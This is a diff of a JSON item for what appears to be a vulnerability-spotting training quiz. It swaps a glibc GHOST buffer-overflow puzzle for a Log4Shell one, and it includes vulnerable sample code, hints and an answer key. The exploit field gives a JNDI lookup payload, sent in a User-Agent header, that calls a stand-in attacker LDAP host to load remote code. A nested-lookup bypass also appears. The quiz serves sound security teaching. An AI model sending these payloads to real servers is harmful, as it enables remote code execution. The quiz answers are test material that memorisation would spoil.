@@ -1,120 +1,114 @@
 {
-  "id": "srd-0009",
+  "id": "srd-0012",
   "date": "2026-10-12",
   "difficulty": "hard",
-  "language": "c",
+  "language": "java",
   "estimatedMinutes": 30,
   "snippet": {
     "files": [
       {
-        "name": "nss_hostname.c",
-        "code": "/* Simplified from glibc __nss_hostname_digits_dots(), pre-patch. */\nint __nss_hostname_digits_dots(const char *name, struct hostent *resbuf,\n                               char *buffer, size_t buflen,\n                               struct hostent **result, int *h_errnop)\n{\n    char *addr_list;\n    char *aliases;\n    size_t size_needed;\n\n    /* Lay out in the caller's buffer: the address, the h_addr_list\n     * pointer array (NULL-terminated), then a copy of `name`. */\n    size_needed = (sizeof(*addr_list) + sizeof(char *))\n                + strlen(name) + 1;\n\n    if (buflen < size_needed)\n    {\n        *h_errnop = NETDB_INTERNAL;\n        return ERANGE;\n    }\n\n    addr_list = buffer;\n    aliases   = buffer + sizeof(*addr_list);\n    strcpy(buffer + (sizeof(*addr_list) + sizeof(char *)), name);\n\n    *result = resbuf;\n    return 0;\n}\n",
+        "name": "LogRequest.java",
+        "code": "// Simplified from Apache Log4j2 message formatting, pre-2.15.\npublic void logRequest(HttpServletRequest req) {\n    String ua = req.getHeader(\"User-Agent\");\n    logger.info(\"request from {} ua={}\", req.getRemoteAddr(), ua);\n}\n\n// Inside the logging pipeline, the formatted message is scanned for\n// ${...} expressions and each is resolved by a lookup (jndi, env, ...).\nstatic String render(String formatted) {\n    return StrSubstitutor.replace(formatted);   // expands ${jndi:...}\n}",
         "notes": {
-          "2": "Entry point used when resolving a host given as a numeric/dotted string.",
-          "3": "`buffer`/`buflen` is scratch space the caller provides for the function to write into.",
-          "12": "Computes how many bytes it will need in `buffer` for the address, the pointer array, and a copy of `name`.",
-          "13": "Adds the length of `name` plus one for the NUL terminator.",
-          "15": "Bails out with ERANGE if the caller's buffer is smaller than that estimate.",
-          "21": "Points `addr_list` at the start of the buffer.",
-          "22": "Points `aliases` just past the address.",
-          "23": "Copies `name` into the buffer at an offset — this is the write that can run past the end.",
-          "25": "Hands the result back to the caller."
+          "3": "Reads the client-supplied User-Agent header.",
+          "4": "Logs it. The `{}` placeholders are replaced with the address and the User-Agent.",
+          "7": "After the message is assembled, the pipeline scans the final text for `${...}` expressions.",
+          "9": "Helper that performs that expansion.",
+          "10": "Resolves each `${...}` via a lookup — including `${jndi:...}`, which reaches out over the network."
         }
       }
     ]
   },
   "stages": {
     "line": {
-      "file": "nss_hostname.c",
-      "line": 12,
+      "file": "LogRequest.java",
+      "line": 10,
       "yellowRadius": 2,
       "maxGuesses": 5
     },
     "bugClass": {
-      "answer": "buffer-overflow",
+      "answer": "log-inj",
       "options": [
-        "buffer-overflow",
-        "int-overflow",
-        "oob-read",
-        "use-after-free",
-        "null-deref",
-        "format-string",
-        "sign-confusion"
+        "log-inj",
+        "code-inj",
+        "insecure-deser",
+        "ssrf",
+        "command-inj",
+        "xxe"
       ]
     },
     "why": {
-      "answerIndex": 0,
+      "answerIndex": 1,
       "options": [
         {
-          "label": "`size_needed` under-counts what will actually be written (it omits alignment and the full pointer array), so the buffer check passes for buffers that are too small and the `strcpy` runs off the end"
+          "label": "Logging the User-Agent on every request fills the disk, a denial of service",
+          "whyWrong": "Log volume is unrelated; the danger is that the log text is interpreted, not merely stored."
         },
         {
-          "label": "`strcpy` is inherently unsafe and must never be used in C",
-          "whyWrong": "`strcpy` into a correctly sized buffer is fine; the defect is that the size check guarding it is wrong, not the copy primitive."
+          "label": "The log message contains attacker text that is interpolated for `${}` lookups, so `${jndi:ldap://attacker/x}` makes the server resolve a remote object and load attacker code"
         },
         {
-          "label": "`*result` is left unset on the error path, causing the caller to dereference a stale pointer",
-          "whyWrong": "The error path returns ERANGE and the caller handles it; that's not where memory is corrupted."
+          "label": "`getRemoteAddr()` can be spoofed via X-Forwarded-For",
+          "whyWrong": "Address spoofing is a different concern and doesn't lead to code execution here."
         }
       ]
     },
     "fix": {
-      "answerIndex": 2,
+      "answerIndex": 1,
       "options": [
         {
-          "label": "Use strncpy bounded by buflen",
-          "diff": "-    strcpy(buffer + (sizeof(*addr_list) + sizeof(char *)), name);\n+    strncpy(buffer + (sizeof(*addr_list) + sizeof(char *)), name, buflen);",
-          "whyWrong": "strncpy with buflen ignores the bytes already consumed by the address and pointer array, can still write past the buffer, and leaves the copy unterminated. The real defect is the under-counted size check, not the copy function."
+          "label": "Strip the substring '${' from the User-Agent before logging",
+          "diff": "-    logger.info(\"request from {} ua={}\", req.getRemoteAddr(), ua);\n+    logger.info(\"request from {} ua={}\", req.getRemoteAddr(), ua.replace(\"${\", \"\"));",
+          "whyWrong": "Obfuscated and nested forms like `${${lower:j}ndi:...}` reconstruct the sequence after naive stripping."
         },
         {
-          "label": "Reject names longer than 255 bytes",
-          "diff": "+    if (strlen(name) > 255)\n+        return ERANGE;\n     size_needed = ...",
-          "whyWrong": "A fixed cap doesn't match the actual layout the function writes; a shorter name can still overflow a small caller buffer, and a valid long name is rejected. The size check must reflect what is written."
+          "label": "Disable message-pattern lookups and remove JNDI resolution (e.g. formatMsgNoLookups / upgrade)",
+          "diff": "-    return StrSubstitutor.replace(formatted);\n+    return formatted; // message lookups disabled; JNDI lookup removed"
         },
         {
-          "label": "Count every region the layout writes, including alignment, in size_needed",
-          "diff": "-    size_needed = (sizeof(*addr_list) + sizeof(char *))\n-                + strlen(name) + 1;\n+    size_t align = __alignof__(char *);\n+    size_needed = ((strlen(name) + 1 + align - 1) & ~(align - 1))\n+                + sizeof(char *)        /* h_addr_list[0] */\n+                + sizeof(char *);       /* NULL terminator of the array */"
+          "label": "HTML-escape the User-Agent before logging",
+          "diff": "-    ... ua);\n+    ... escapeHtml(ua));",
+          "whyWrong": "Wrong context entirely; HTML escaping doesn't stop `${}` lookup interpolation."
         },
         {
-          "label": "Zero the buffer before writing",
-          "diff": "+    memset(buffer, 0, buflen);\n     addr_list = buffer;",
-          "whyWrong": "Zeroing does not change how many bytes strcpy writes. If size_needed under-counts, the strcpy still runs off the end of the buffer."
+          "label": "Log at debug level instead of info",
+          "diff": "-    logger.info(...)\n+    logger.debug(...)",
+          "whyWrong": "The lookup still runs whenever the statement is logged; the level is irrelevant."
         }
       ]
     }
   },
   "source": {
     "origin": "cve",
-    "cve": "CVE-2015-0235",
-    "project": "GNU C Library (glibc)",
-    "fixCommit": "https://sourceware.org/git/?p=glibc.git;a=commit;h=d5dd6189d506068ed11c8bfa1e1e9bffde04decd",
-    "advisory": "https://nvd.nist.gov/vuln/detail/CVE-2015-0235",
-    "license": "LGPL-2.1-or-later",
-    "attribution": "GNU C Library, CVE-2015-0235 (GHOST)"
+    "cve": "CVE-2021-44228",
+    "project": "Apache Log4j2",
+    "advisory": "https://nvd.nist.gov/vuln/detail/CVE-2021-44228",
+    "license": "Apache-2.0",
+    "attribution": "Apache Log4j2, CVE-2021-44228 (Log4Shell), simplified"
   },
   "training": {
-    "exploit": "Reach this via `gethostbyname` with a crafted all-digits-and-dots hostname whose length is chosen so `size_needed` passes the check but the real layout needs a few more bytes (the omitted alignment + pointer-array space). The `strcpy` then overflows the caller's buffer by those bytes, corrupting adjacent heap metadata — which on affected systems (e.g. the Exim mail server) was turned into remote code execution.",
+    "exploit": "Send `User-Agent: ${jndi:ldap://attacker.example/a}`. When the line is logged, Log4j interpolates the `${jndi:...}` lookup, connects to the attacker's LDAP server, downloads the referenced Java class, and executes it — unauthenticated remote code execution. Any logged attacker-controlled field (headers, form fields, usernames) is a vector.",
     "concepts": [
-      "CWE-787",
-      "CVE-2015-0235"
+      "CWE-917",
+      "CVE-2021-44228"
     ],
     "hints": {
-      "line": "The overflow is a copy; the root cause is the arithmetic a few lines above it.",
-      "bugClass": "Memory is written past the end of a buffer.",
-      "why": "Does `size_needed` really account for everything written after line 21?",
-      "fix": "Make the size the check uses match every byte the layout writes."
+      "line": "The dangerous step interprets the log text, not the one that writes it.",
+      "bugClass": "Attacker text in a log message is evaluated as an expression.",
+      "why": "What does a `${jndi:...}` lookup actually do?",
+      "fix": "Stop interpreting log messages as expressions, and remove JNDI."
     }
   },
   "writeup": {
-    "summary": "`size_needed` is meant to cover everything the function writes into the caller's `buffer`, but it under-counts: it omits the alignment padding and the full size of the NULL-terminated pointer array. The `if (buflen < size_needed)` guard therefore passes for buffers that are actually too small, and the following `strcpy` writes `name` past the end of `buffer` — a heap (or stack) buffer overflow driven by a long hostname fed through `gethostbyname`. Because resolver paths are reachable from many network-facing services, GHOST was remotely triggerable. The correct fix recomputes `size_needed` to account for every region written, including alignment, so the length check is accurate. Bounding the copy or capping the name treats symptoms; the root cause is the wrong size in the check.",
+    "summary": "Log4j2 scanned every formatted log message for `${...}` expressions and resolved them via lookups, including `jndi`. Because logged data often includes attacker-controlled fields (here the User-Agent), a value of `${jndi:ldap://attacker/x}` made the server connect to an attacker LDAP/RMI endpoint and load a remote class — remote code execution just by being logged. This is Log4Shell. The real remediation disabled message lookups and removed JNDI resolution; string-stripping defenses were repeatedly bypassed with nested lookups.",
     "readNext": [
       {
-        "label": "Qualys advisory: GHOST (CVE-2015-0235)",
-        "url": "https://www.qualys.com/2015/01/27/cve-2015-0235/GHOST-CVE-2015-0235.txt"
+        "label": "CVE-2021-44228 (NVD)",
+        "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-44228"
       },
       {
-        "label": "glibc fix commit d5dd6189",
-        "url": "https://sourceware.org/git/?p=glibc.git;a=commit;h=d5dd6189d506068ed11c8bfa1e1e9bffde04decd"
+        "label": "Apache Log4j Security Advisories",
+        "url": "https://logging.apache.org/log4j/2.x/security.html"
       }
     ]
   }
